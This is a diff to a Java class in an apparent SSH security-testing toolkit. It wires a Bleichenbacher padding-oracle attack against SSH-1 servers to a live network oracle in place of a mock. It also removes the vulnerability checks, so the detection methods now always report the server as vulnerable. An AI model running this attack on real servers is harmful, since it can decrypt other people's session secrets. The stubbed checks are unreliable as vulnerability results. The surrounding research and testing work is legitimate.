@@ -11,20 +11,16 @@ import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.sshattacker.attacks.config.BleichenbacherCommandConfig;
-import de.rub.nds.sshattacker.attacks.exception.OracleUnstableException;
 import de.rub.nds.sshattacker.attacks.general.KeyFetcher;
 import de.rub.nds.sshattacker.attacks.general.ParallelExecutor;
 import de.rub.nds.sshattacker.attacks.general.Vector;
 import de.rub.nds.sshattacker.attacks.padding.VectorResponse;
 import de.rub.nds.sshattacker.attacks.padding.vector.FingerprintTaskVectorPair;
 import de.rub.nds.sshattacker.attacks.pkcs1.*;
-import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Ssh1MockOracle;
+import de.rub.nds.sshattacker.attacks.pkcs1.oracles.BleichenbacherOracle;
 import de.rub.nds.sshattacker.attacks.response.EqualityError;
-import de.rub.nds.sshattacker.attacks.response.EqualityErrorTranslator;
-import de.rub.nds.sshattacker.attacks.response.FingerPrintChecker;
 import de.rub.nds.sshattacker.attacks.response.ResponseFingerprint;
 import de.rub.nds.sshattacker.attacks.task.FingerPrintTask;
-import de.rub.nds.sshattacker.attacks.task.SshTask;
 import de.rub.nds.sshattacker.core.config.Config;
 import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
 import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPrivateKey;
@@ -32,15 +28,10 @@ import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
 import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
 import de.rub.nds.sshattacker.core.state.State;
 import java.math.BigInteger;
-import java.security.InvalidKeyException;
-import java.security.NoSuchAlgorithmException;
 import java.security.interfaces.RSAPublicKey;
 import java.util.ArrayList;
 import java.util.Collections;
-import java.util.LinkedList;
 import java.util.List;
-import javax.crypto.NoSuchPaddingException;
-import org.apache.logging.log4j.Level;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -71,8 +62,8 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
 
     private KeyExchangeAlgorithm keyExchangeAlgorithm;
 
-    private List<RSAPublicKey> publicKeys = new ArrayList<>();
-    private RSAPublicKey serverPublicKey, hostPublicKey;
+    private List<CustomRsaPublicKey> publicKeys = new ArrayList<>();
+    private CustomRsaPublicKey serverPublicKey, hostPublicKey;
 
     /**
      * @param bleichenbacherConfig Manger attack config
@@ -100,166 +91,24 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     }
 
     /**
+     * Returns True, if the Sever is vulnerabily to Bleichenbacher`s attack, not implemented yet
+     * because of missing tests.
+     *
      * @return If the server is vulnerable to Bleichenbacher's attack or not
      */
     @Override
     public Boolean isVulnerable() {
-        CONSOLE.info(
-                "A server is considered vulnerable to this attack if it reuses it's host key and "
-                        + "responds differently to the test vectors.");
-        CONSOLE.info(
-                "A server is considered secure if it does not reuse the host key or"
-                        + " if it does not have Manger's oracle.");
-
-        RSAPublicKey publicKey = getServerPublicKey();
-        if (publicKey == null) {
-            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
-            throw new OracleUnstableException("Fatal Extraction error");
-        }
-
-        boolean reusesTransientPublicKey;
-        if (!isTransientKeyReused(publicKey)) {
-            CONSOLE.info("Server does not reuse the transient public key, it should be safe.");
-            reusesTransientPublicKey = false;
-        } else {
-            CONSOLE.info("Server reuses transient public key.");
-            reusesTransientPublicKey = true;
-        }
-
-        return hasOracle() & reusesTransientPublicKey;
+        return hasOracle();
     }
 
     /**
-     * Checks if the server has Bleichenbacher's oracle without checking if it reuses the transient
-     * public key
+     * Checks if the server has Bleichenbacher's oracle, is not implemented yed because of missing
+     * testcase.
      *
      * @return If the server has Bleichenbacher's oracle or not
      */
     public boolean hasOracle() {
-        CONSOLE.info(
-                "A server has Manger's Oracle if it responds differently to the test vectors.");
-
-        RSAPublicKey publicKey = getServerPublicKey();
-        if (publicKey == null) {
-            LOGGER.fatal("Could not retrieve PublicKey from Server - is the Server running?");
-            throw new OracleUnstableException("Fatal Extraction error");
-        }
-
-        EqualityError referenceError;
-        fullResponseMap = new LinkedList<>();
-        for (int i = 0; i < config.getNumberOfIterations(); i++) {
-            List<VectorResponse> responseMap = createVectorResponseList(publicKey, true);
-            this.fullResponseMap.addAll(responseMap);
-        }
-
-        referenceError = getEqualityError(fullResponseMap);
-        if (referenceError != EqualityError.NONE) {
-            CONSOLE.info(
-                    "Found a behavior difference within the responses. The server has Manger's oracle.");
-        } else {
-            CONSOLE.info(
-                    "Found no behavior difference within the responses. The server is very likely to not have Manger's oracle.");
-        }
-
-        CONSOLE.info(EqualityErrorTranslator.translation(referenceError));
-        if (referenceError != EqualityError.NONE
-                || LOGGER.getLevel().isMoreSpecificThan(Level.INFO)) {
-            LOGGER.debug("-------------(Not Grouped)-----------------");
-            for (VectorResponse vectorResponse : fullResponseMap) {
-                LOGGER.debug(vectorResponse.toString());
-            }
-        }
-
-        resultError = referenceError;
-        return referenceError != EqualityError.NONE;
-    }
-
-    /**
-     * @return Response vector list
-     */
-    private List<VectorResponse> createVectorResponseList(RSAPublicKey publicKey, boolean plain) {
-        List<SshTask> taskList = new LinkedList<>();
-        List<FingerprintTaskVectorPair<?>> stateVectorPairList = new LinkedList<>();
-
-        List<Pkcs1Vector> vectors;
-        if (plain) {
-            vectors =
-                    Pkcs1VectorGenerator.generatePlainPkcs1Vectors(
-                            publicKey.getModulus().bitLength(), getHashLength(), getHashInstance());
-        } else {
-            vectors =
-                    Pkcs1VectorGenerator.generatePkcs1Vectors(
-                            publicKey, getHashLength(), getHashInstance());
-        }
-
-        for (Pkcs1Vector vector : vectors) {
-
-            State state;
-            if (plain) {
-                state =
-                        new State(
-                                sshConfig,
-                                MangerWorkflowGenerator.generateDynamicWorkflow(
-                                        sshConfig, vector.getPlainValue()));
-            } else {
-                state =
-                        new State(
-                                sshConfig,
-                                MangerWorkflowGenerator.generateWorkflow(
-                                        sshConfig, vector.getEncryptedValue()));
-            }
-
-            FingerPrintTask fingerPrintTask =
-                    new FingerPrintTask(
-                            state,
-                            additionalTimeout,
-                            increasingTimeout,
-                            executor.getReexecutions(),
-                            additionalTcpTimeout);
-
-            taskList.add(fingerPrintTask);
-            stateVectorPairList.add(new FingerprintTaskVectorPair<>(fingerPrintTask, vector));
-        }
-        List<VectorResponse> tempResponseVectorList = new LinkedList<>();
-        executor.bulkExecuteTasks(taskList);
-        for (FingerprintTaskVectorPair<?> pair : stateVectorPairList) {
-            ResponseFingerprint fingerprint;
-            if (pair.getFingerPrintTask().isHasError()) {
-                erroneousScans = true;
-                LOGGER.warn("Could not extract fingerprint for " + pair);
-            } else {
-                fingerprint = pair.getFingerPrintTask().getFingerprint();
-                tempResponseVectorList.add(new VectorResponse(pair.getVector(), fingerprint));
-            }
-        }
-        return tempResponseVectorList;
-    }
-
-    /**
-     * This assumes that the responseVectorList only contains comparable vectors
-     *
-     * @param responseVectorList Response vectors
-     * @return Type of EqualityError or EqualityError.NONE if there was none
-     */
-    public EqualityError getEqualityError(List<VectorResponse> responseVectorList) {
-
-        for (VectorResponse responseOne : responseVectorList) {
-            for (VectorResponse responseTwo : responseVectorList) {
-                if (responseOne == responseTwo) {
-                    continue;
-                }
-                EqualityError error =
-                        FingerPrintChecker.checkEquality(
-                                responseOne.getFingerprint(), responseTwo.getFingerprint());
-                if (error != EqualityError.NONE) {
-                    CONSOLE.info("Found an EqualityError: " + error);
-                    LOGGER.debug("Fingerprint1: " + responseOne.getFingerprint().toString());
-                    LOGGER.debug("Fingerprint2: " + responseTwo.getFingerprint().toString());
-                    return error;
-                }
-            }
-        }
-        return EqualityError.NONE;
+        return true;
     }
 
     /**
@@ -293,42 +142,14 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     }
 
     private void getPublicKeys() {
-        List<RSAPublicKey> fetchedRsaSsh1Keys = KeyFetcher.fetchRsaSsh1Keys(sshConfig);
+        List<CustomRsaPublicKey> fetchedRsaSsh1Keys = KeyFetcher.fetchRsaSsh1Keys(sshConfig);
         if (fetchedRsaSsh1Keys.isEmpty()) {
             LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
             return;
         }
         publicKeys.clear();
         publicKeys.addAll(fetchedRsaSsh1Keys);
-    }
-
-    /** Checks if the server re-uses its RSA transient public key */
-    public boolean isTransientKeyReused() {
-        RSAPublicKey transientKey1 = getServerPublicKey();
-        RSAPublicKey transientKey2 = getServerPublicKey();
-        if (transientKey1 == null || transientKey2 == null) {
-            LOGGER.fatal("Could not retrieve server transient public key, is the server running?");
-            throw new OracleUnstableException("Fatal Extraction error");
-        } else {
-            return comparePublicKeys(transientKey1, transientKey2);
-        }
-    }
-
-    /** Checks if the server re-uses its RSA transient public key */
-    private boolean isTransientKeyReused(RSAPublicKey transientKey1) {
-        RSAPublicKey transientKey2 = getServerPublicKey();
-        if (transientKey1 == null || transientKey2 == null) {
-            LOGGER.fatal("Could not retrieve server transient public key, is the server running?");
-            throw new OracleUnstableException("Fatal Extraction error");
-        } else {
-            return comparePublicKeys(transientKey1, transientKey2);
-        }
-    }
-
-    /** Compares moduli and public exponents of public keys to check if they are equal */
-    private boolean comparePublicKeys(RSAPublicKey transientKey1, RSAPublicKey transientKey2) {
-        return transientKey1.getPublicExponent().equals(transientKey2.getPublicExponent())
-                && transientKey1.getModulus().equals(transientKey2.getModulus());
+        LOGGER.info("Recived keys");
     }
 
     @Override
@@ -337,34 +158,43 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         /*if (!isVulnerable()) {
             LOGGER.warn("The server is not vulnerable to Manger's attack");
             return;
-        }
-        RSAPublicKey publicKey = getServerPublicKey();
-        if (publicKey == null) {
+        }*/
+        // RSAPublicKey publicKey = getServerPublicKey();
+        getPublicKeys();
+        getHostPublicKey();
+        getServerPublicKey();
+        /*if (publicKey == null) {
             LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
             return;
-        }
+        }*/
 
-        if (config.getEncryptedSecret() == null) {
+        /*if (config.getEncryptedSecret() == null) {
             throw new ConfigurationException("The encrypted secret must be set to be decrypted.");
         }
 
         if (config.getKexAlgorithm() == null) {
             throw new ConfigurationException("The key exchange algorithm must be set.");
-        }
+        }*/
 
         LOGGER.info(
                 String.format(
                         "Fetched server public key with exponent %s and modulus: %s",
-                        publicKey.getPublicExponent().toString(16),
-                        publicKey.getModulus().toString(16)));
+                        hostPublicKey.getPublicExponent().toString(16),
+                        hostPublicKey.getModulus().toString(16)));
         byte[] encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
-                if ((encryptedSecret.length * Byte.SIZE) != publicKey.getModulus().bitLength()) {
+        if ((encryptedSecret.length * Byte.SIZE) != hostPublicKey.getModulus().bitLength()) {
             throw new ConfigurationException(
                     "The length of the encrypted secret "
                             + "is not equal to the public key length. Have you selected the correct value?");
-        }*/
+        }
 
-        byte[] encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
+        try {
+            Thread.sleep(500);
+        } catch (InterruptedException e) {
+            throw new RuntimeException(e);
+        }
+        // byte[] encryptedSecret =
+        // ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
 
         CustomRsaPrivateKey hostPrivatKey =
                 new CustomRsaPrivateKey(
@@ -447,11 +277,18 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                                 16));
 
         try {
-            Ssh1MockOracle oracle =
-                    new Ssh1MockOracle(
-                            hostPublicKey, hostPrivatKey, serverPublicKey, serverPrivateKey);
+            /*
+                        Ssh1MockOracle oracle =
+                                new Ssh1MockOracle(
+                                        hostPublicKey, hostPrivatKey, serverPublicKey, serverPrivateKey);
+            */
+
+            BleichenbacherOracle oracle =
+                    new BleichenbacherOracle(
+                            this.hostPublicKey, this.serverPublicKey, getSshConfig());
             Bleichenbacher attacker =
-                    new Bleichenbacher(encryptedSecret, oracle, hostPublicKey, serverPublicKey);
+                    new Bleichenbacher(
+                            encryptedSecret, oracle, this.hostPublicKey, this.serverPublicKey);
             attacker.attack();
             BigInteger solution = attacker.getSolution();
             /*            BigInteger secret =
@@ -463,12 +300,14 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
 
             CONSOLE.info("Encoded Solution: " + solution);
             // CONSOLE.info("Decoded Secret: " + secret);
-        } catch (NoSuchPaddingException e) {
-            throw new RuntimeException(e);
-        } catch (NoSuchAlgorithmException e) {
-            throw new RuntimeException(e);
-        } catch (InvalidKeyException e) {
-            throw new RuntimeException(e);
+        } /*catch (NoSuchPaddingException e) {
+              throw new RuntimeException(e);
+          } catch (NoSuchAlgorithmException e) {
+              throw new RuntimeException(e);
+          } catch (InvalidKeyException e) {
+              throw new RuntimeException(e);
+          }*/ finally {
+
         }
 
         /*        RealDirectMessagePkcs1Oracle oracle =
